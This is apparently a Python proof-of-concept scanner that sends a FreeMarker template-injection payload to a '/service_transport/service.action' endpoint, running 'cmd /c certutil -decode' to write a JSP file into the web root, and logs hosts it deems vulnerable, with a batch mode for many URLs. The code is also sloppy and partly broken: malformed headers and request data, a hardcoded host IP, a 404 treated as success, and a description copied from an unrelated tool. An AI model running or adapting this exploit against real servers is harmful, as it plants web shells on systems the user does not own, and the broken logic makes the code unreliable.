# -*- coding: utf-8 -*-
import argparse
import sys
import requests
requests.packages.urllib3.disable_warnings()


def banner():
    test = """

 _____                                           _   _____      _           _   _             
/  __ \                                         | | |_   _|    (_)         | | (_)            
| /  \/ ___  _ __ ___  _ __ ___   __ _ _ __   __| |   | | _ __  _  ___  ___| |_ _  ___  _ __  
| |    / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |   | || '_ \| |/ _ \/ __| __| |/ _ \| '_ \ 
| \__/\ (_) | | | | | | | | | | | (_| | | | | (_| |  _| || | | | |  __/ (__| |_| | (_) | | | |
 \____/\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|  \___/_| |_| |\___|\___|\__|_|\___/|_| |_|
                                                              _/ |                            
                                                             |__/                             
    
    @version:1.0.0   @author  dkop
     """
    print(test)


def poc(target):
    url =target+ "/service_transport/service.action HTTP/1.1"
    headers = {
        "Host: 159.27.64.200:8080",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
                      " Chrome/109.0.5414.120 Safari/537.36",
        "Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept - Encoding: gzip,deflate",
        "Accept - Language: zh - CN, zh;q = 0.8, zh - TW;q = 0.7, zh - HK;q = 0.5, en - US;q = 0.3, en;q = 0.2",
        "Cookie: JSESSIONID=C6E16AD563645FA74B1FBAC6A788EC01",
        "Upgrade - Insecure - Requests: 1"

    }
    data={
        """{
         "command": "GetFZinfo", 
        "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c certutil -decode ./webapps/ROOT/1.txt ./webapps/ROOT/1.jsp\")}"
}"""
    }
    try:
        res = requests.post(url,headers,data,verify=False)
        if res.status_code == 404:
            print(f"[+] {target} is vulnerable, Command Injection")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-] {target} is not vulnerable")
    except:
        print(f"[*] {target} server error")


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak password')
    parser.add_argument("-u", "--url", dest="url", type=str, help="example: http//www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
        print(f"我在使用-u参数  跑单个url")
    elif not args.url and args.file:
        print(f"我在使用-f参数  批量跑url")
    else:
        print(f"Usage:\n\t  python3 {sys.argv[0]}  -h")



if __name__ == '__main__':
   main()
